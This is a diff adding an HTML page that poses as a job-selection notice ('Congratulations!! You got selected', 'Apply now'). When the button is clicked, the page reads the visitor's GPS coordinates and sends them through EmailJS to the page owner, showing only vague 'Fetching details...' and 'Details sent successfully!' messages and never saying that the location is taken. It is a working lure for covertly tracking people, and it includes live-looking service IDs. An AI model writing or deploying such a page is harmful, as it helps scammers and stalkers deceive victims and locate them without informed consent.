@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Send Location</title>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("S7S_iRAJVFq1WxDPU"); // Replace with your EmailJS user ID
+    })();
+  </script>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 2em; }
+    button { padding: 1em; font-size: 16px; }
+  </style>
+</head>
+<body>
+  <h1>Congratulations!! You got selected</h1>
+  <p>Click the button below to apply.</p>
+  <button onclick="sendLocation()">Apply now</button>
+  <p id="status"></p>
+
+  <script>
+    function sendLocation() {
+      if (!navigator.geolocation) {
+        document.getElementById('status').innerText = 'This is not supported by your browser';
+        return;
+      }
+
+      document.getElementById('status').innerText = 'Fetching details...';
+
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        emailjs.send("service_etpl21i", "template_0ydl24l", {
+          latitude: latitude,
+          longitude: longitude
+        }).then(function(response) {
+          document.getElementById('status').innerText = 'Details sent successfully!';
+        }, function(error) {
+          document.getElementById('status').innerText = 'Failed to send details.';
+          console.error(error);
+        });
+      }, function() {
+        document.getElementById('status').innerText = 'Unable to retrieve your details.';
+      });
+    }
+  </script>
+</body>
+</html>
